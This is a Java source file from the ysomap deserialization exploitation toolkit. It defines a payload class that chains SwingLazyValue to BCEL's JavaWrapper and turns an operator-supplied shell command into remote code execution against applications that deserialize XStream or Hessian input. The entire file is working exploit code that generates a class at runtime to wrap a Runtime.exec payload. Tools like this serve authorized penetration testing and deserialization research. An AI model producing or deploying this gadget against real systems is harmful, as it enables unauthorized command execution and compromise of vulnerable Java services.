package ysomap.bullets.jdk;

import javassist.ClassPool;
import javassist.CtClass;
import sun.swing.SwingLazyValue;
import ysomap.bullets.AbstractBullet;
import ysomap.bullets.Bullet;
import ysomap.common.annotation.*;
import ysomap.core.util.ClassFiles;
import ysomap.core.util.PayloadHelper;

import java.util.Random;

/**
 * @author wh1t3P1g
 * @since 2021/1/4
 */
@Bullets
@Dependencies({"jdk"})
@Details("文件写入")
@Targets({Targets.XSTREAM, Targets.HESSIAN})
@Authors({Authors.WH1T3P1G})
public class SwingLazyValueWithBCEL extends AbstractBullet<SwingLazyValue> {

    @NotNull
    @Require(name = "command", detail = "like ls")
    public String command;

    @Override
    public SwingLazyValue getObject() throws Exception {
        String classname = "com.sun.org.apache.bcel.internal.util.JavaWrapper";
        String methodName = "_main";
        String code = PayloadHelper.makeRuntimeExecPayload(command);
        byte[] bytes = makePayload(code);
        Object[] evilargs = new Object[]{new String[]{PayloadHelper.makeBCELStr(bytes), "ysomap"}};
        return new SwingLazyValue(classname, methodName, evilargs);
    }

    public static Bullet newInstance(Object... args) throws Exception {
        Bullet bullet = new SwingLazyValueWithBCEL();
        bullet.set("command", args[0]);
        return bullet;
    }

    public byte[] makePayload(String body) throws Exception {
        ClassPool pool = new ClassPool(true);
        String classname = "pwn"+new Random().nextLong();
        CtClass cls = ClassFiles.makeEmptyClassFile(pool, classname, null);
        String wrappedBody = "public static void _main(String[] argv) throws Exception {\n" +
                String.format("        %s\n", body) +
                "    }";
        ClassFiles.insertMethod(cls, wrappedBody);
        return cls.toBytecode();
    }
}
